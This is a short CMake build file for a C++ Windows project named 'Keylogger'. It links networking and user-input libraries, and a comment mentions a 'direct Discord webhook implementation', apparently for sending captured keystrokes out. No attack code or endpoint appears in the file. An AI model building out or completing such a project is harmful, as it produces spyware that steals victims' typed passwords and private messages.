cmake_minimum_required(VERSION 3.10)
project(Keylogger VERSION 1.0)

# Specify C++ standard
set(CMAKE_CXX_STANDARD 14)
set(CMAKE_CXX_STANDARD_REQUIRED True)

# Include directories
include_directories(include)

# Add source files - simplified for direct Discord webhook implementation
set(SOURCES
    src/main.cpp
)

# Add executable
add_executable(Keylogger ${SOURCES})

# Link Windows libraries
target_link_libraries(Keylogger ws2_32 wininet user32) 